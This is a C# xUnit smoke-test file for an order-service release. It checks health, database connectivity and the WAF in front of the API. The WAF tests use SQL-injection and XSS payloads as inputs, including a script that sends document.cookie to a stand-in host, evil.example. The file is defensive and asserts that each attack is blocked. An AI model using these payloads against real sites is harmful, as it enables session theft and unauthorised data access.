using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.Extensions.DependencyInjection;
using OrderService.Data;
using Xunit;

namespace OrderService.Tests;

/// <summary>
/// Smoke-тесты (дым-тесты) релиза OrderService 2.0.0 — выполняются сразу после деплоя
/// (раздел 2 регламента docs/RELEASE_REGULATION.md). Первые два — обязательные по заданию,
/// остальные — проверки кейса 10 «WAF перед API».
/// </summary>
[Trait("Category", "Smoke")]
public sealed class SmokeTests : IDisposable
{
    private readonly OrderServiceFactory _factory = new();
    private readonly HttpClient _client;

    public SmokeTests() => _client = _factory.CreateClient();

    [Fact(DisplayName = "1. GET /health возвращает 200 и версию релиза 2.0.0")]
    public async Task Health_Returns200()
    {
        using var response = await _client.GetAsync("/health");

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        using var json = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
        Assert.Equal("Healthy", json.RootElement.GetProperty("status").GetString());
        Assert.Equal("2.0.0", json.RootElement.GetProperty("version").GetString());
        Assert.Equal("On", response.Headers.GetValues("X-Waf-Mode").Single()); // WAF включён в боевом режиме
    }

    [Fact(DisplayName = "2. DbContext.Database.CanConnect() — подключение к БД есть")]
    public void Database_CanConnect()
    {
        using var scope = _factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<OrderDbContext>();

        Assert.True(db.Database.CanConnect());
    }

    [Fact(DisplayName = "3. WAF пропускает сложный JSON мобильного приложения (нет ложного срабатывания)")]
    public async Task Waf_AllowsComplexMobileJson()
    {
        // Реальный по структуре заказ: вложенные объекты, опции, апострофы, кавычки,
        // «опасные» слова в обычном тексте — именно на таком ломаются неотлаженные правила WAF
        var order = new
        {
            customerId = "mobile-user-10",
            channel = "mobile",
            items = new object[]
            {
                new { sku = "PIZZA-30", name = "Пицца «4 сыра»", quantity = 2, price = 649.00m,
                      options = new Dictionary<string, string> { ["size"] = "30 см", ["crust"] = "тонкое" } },
                new { sku = "DRINK-05", name = "Morse 0.5 l", quantity = 1, price = 120.00m, options = (object?)null }
            },
            delivery = new { address = "ул. O'Connor, д. 5", entrance = "2", floor = "7", timeSlot = "18:00-19:00" },
            comment = "Select the fastest courier please; order by phone, код домофона 15#. Don't ring \"twice\""
        };

        using var response = await _client.PostAsJsonAsync("/api/v1/orders", order);

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);
    }

    [Theory(DisplayName = "4. WAF блокирует атаки (SQL-инъекция, XSS) ответом 403")]
    [InlineData("/api/v1/orders/00000000-0000-0000-0000-000000000001?search=1%27%20OR%20%271%27%3D%271", "942130")]
    [InlineData("/api/v1/orders/00000000-0000-0000-0000-000000000001?q=1%20UNION%20SELECT%20password%20FROM%20users", "942100")]
    [InlineData("/api/v1/orders/00000000-0000-0000-0000-000000000001?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "941100")]
    public async Task Waf_BlocksAttacks(string url, string expectedRule)
    {
        using var response = await _client.GetAsync(url);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
        using var json = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
        Assert.Equal(expectedRule, json.RootElement.GetProperty("ruleId").GetString());
    }

    [Fact(DisplayName = "5. WAF проверяет значения JSON-тела: XSS в комментарии заказа блокируется")]
    public async Task Waf_BlocksXssInsideJsonBody()
    {
        var order = new
        {
            customerId = "attacker",
            channel = "web",
            items = new[] { new { sku = "X", name = "X", quantity = 1, price = 1m } },
            comment = "<script>fetch('//evil.example/'+document.cookie)</script>"
        };

        using var response = await _client.PostAsJsonAsync("/api/v1/orders", order);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    public void Dispose()
    {
        _client.Dispose();
        _factory.Dispose();
    }
}
